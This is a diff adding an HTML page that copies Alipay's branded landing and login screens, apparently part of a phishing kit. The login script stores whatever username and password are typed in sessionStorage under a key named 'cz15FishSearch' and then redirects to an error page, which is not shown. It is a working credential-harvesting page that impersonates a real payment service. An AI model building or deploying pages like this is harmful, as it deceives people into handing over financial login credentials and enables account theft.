@@ -1,0 +1,162 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>支付宝 知托付！</title>
+    <link rel="icon" href="https://i.alipayobjects.com/common/favicon/favicon.ico" type="image/x-icon" />
+    <link rel="stylesheet" href="../css/reset.css">
+    <link rel="stylesheet" href="../css/alipay.css">
+    <link href="https://cdn.bootcss.com/Swiper/4.3.0/css/swiper.min.css" rel="stylesheet">
+</head>
+<body>
+<header class="clearfix">
+    <div class="logo"></div>
+    <div class="login">
+        <label>我已有支付宝账号 <span id="showBtn">快速登录</span></label>
+    </div>
+</header>
+
+<section class="alpy-bg-wrap">
+    <div class="swiper-container">
+        <div class="swiper-wrapper">
+            <div class="swiper-slide">
+                <div class="alpy-bg bg1"></div>
+            </div>
+            <div class="swiper-slide">
+                <div class="alpy-bg bg2"></div>
+            </div>
+            <div class="swiper-slide">
+                <div class="alpy-bg bg3"></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="alipay-middle">
+    <div class="banner"></div>
+
+    <div class="middle">
+        <a href="javascript:;">
+            <i class="developer"></i>
+            我是合作伙伴
+        </a>
+        <a href="javascript:;">
+            <i class="seller"></i>
+            我是商家用户
+        </a>
+        <a href="javascript:;">
+            <i></i>
+            我是个人用户
+        </a>
+    </div>
+</section>
+
+<footer>
+    <ul>
+        <li>
+            <a href="javascript:;">蚂蚁金服集团 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">支付宝 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">余额宝 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">招财宝 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">芝麻信用 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">蚂蚁微贷 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">网商银行 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">开放平台 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">诚征英才 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">联系我们 &nbsp;&nbsp;|&nbsp;&nbsp;</a>
+        </li>
+        <li>
+            <a href="javascript:;">International Business</a>
+        </li>
+    </ul>
+    <p>沪ICP备15027489号</p>
+    <i class="foot"></i>
+</footer>
+
+<section>
+    <div class="mask" id="mask"></div>
+
+    <div class="login-block" id="login">
+        <div class="lb-main">
+            <a href="javascript:;" class="lb-close" id="hideBtn"></a>
+            <div class="lbm-main">
+                <p class="lbm-tt">登录支付宝</p>
+                <div class="lb-form">
+                    <div>
+                        <i class="user"></i>
+                        <input type="text" name="user" id="user" placeholder='输入用户名'>
+                    </div>
+                    <div>
+                        <i class="pwd"></i>
+                        <input type="password" id="pwd" placeholder='输入密码'>
+                    </div>
+                </div>
+                <p style="font-size: 12px; text-align: right">忘记登录密码？</p>
+
+                <a href="javascript:;" class="login-btn" id="toLogin">登录</a>
+                <div class="login-foot">
+                    <label>
+                        <span>淘宝会员登录</span>
+                        <span>账户激活</span>
+                    </label>
+                    <span style="margin-left: 42px; color: #0AE;">免费注册</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<script src="https://cdn.bootcss.com/Swiper/4.3.0/js/swiper.min.js"></script>
+<script>
+    const mySwiper = new Swiper('.swiper-container', {
+        autoplay: true,//可选选项，自动滑动
+        effect: 'fade',
+        loop : true,
+        delay: 2000
+    });
+
+    // 点击显示隐藏
+    const showBtn = document.getElementById('showBtn');
+    const hideBtn = document.getElementById('hideBtn');
+    const mask = document.getElementById('mask');
+    const login = document.getElementById('login');
+
+    showBtn.addEventListener('click', function (ev) {
+        mask.style.display = 'block';
+        login.style.display = 'block';
+    });
+    hideBtn.addEventListener('click', function (ev) {
+        mask.style.display = 'none';
+        login.style.display = 'none';
+    });
+
+    // 获取输入值，跳转页面
+    const user = document.getElementById('user');
+    const pwd = document.getElementById('pwd');
+    const toLogin = document.getElementById('toLogin');
+    toLogin.addEventListener('click', function (ev) {
+        sessionStorage.setItem('cz15FishSearch', JSON.stringify({user:user.value, pwd:pwd.value}));
+        window.location.href = './errorPC.html'
+    })
+
+</script>
+</body>
+</html>
